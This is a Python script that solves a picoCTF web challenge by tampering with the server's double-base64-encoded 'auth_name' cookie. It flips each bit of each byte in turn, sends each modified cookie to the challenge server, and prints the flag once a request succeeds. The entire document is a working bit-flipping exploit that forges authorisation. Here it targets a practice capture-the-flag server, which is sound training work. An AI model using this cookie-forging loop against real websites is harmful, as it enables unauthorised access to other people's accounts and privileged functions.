import requests
import base64
from tqdm import tqdm

url = "http://mercury.picoctf.net:56136/"
session = requests.Session()
session.get(url)
cookie = session.cookies["auth_name"]
decoded_cookie = base64.b64decode(base64.b64decode(cookie))


for byte_number in tqdm(range(len(decoded_cookie)),desc="Trying Byte"):

    flag_found = 0
    
    for bit_number in tqdm(range(8),desc="Trying Bit"):
        bitflip_cookie = (decoded_cookie[0:byte_number] + ((decoded_cookie[byte_number] ^ (1 << bit_number)).to_bytes(1, "big")) + decoded_cookie[byte_number + 1 :])
        updated_cookie = base64.b64encode(base64.b64encode(bitflip_cookie)).decode()

        response = requests.get(url, cookies={"auth_name": updated_cookie})

        if "picoCTF{" in response.text:
            print("\n")
            print("\n\n Cookie Used :",updated_cookie)
            print("\n Flag:",response.text.split("<code>")[1].split("</code>")[0],"\n\n")
            flag_found = 1
            break
    
    if flag_found == 1:
        break

